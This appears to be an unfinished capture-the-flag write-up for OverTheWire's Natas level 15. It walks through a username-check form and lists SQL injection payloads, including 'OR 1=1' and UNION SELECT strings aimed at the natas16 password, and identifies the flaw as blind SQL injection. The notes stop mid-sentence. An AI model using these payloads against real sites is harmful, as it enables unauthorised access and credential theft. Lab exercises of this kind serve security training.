# Natas Level 14 → Level 15

> URL : http://natas15.natas.labs.overthewire.org

- We have a form, which checks if the user exists
- Let's try natas15 --> we get a `This user doesn't exist`
- Let's try natas16 --> we get a `This user exists`
- Now time to read the source code

```sql
SELECT * from users where username=
SELECT * from users where username="user" OR 1=1--"
SELECT * from users where username="user" UNION SELECT * FROM users where username="natas16" and password=#"
SELECT * from users where username="test" UNION SELECT * FROM users where username="natas16" and password=#"

```
- In this example the sql query doesn't echo or return anything to us, but it just returns a yes or no.
- So this is an example of `blind sqli`
- Now 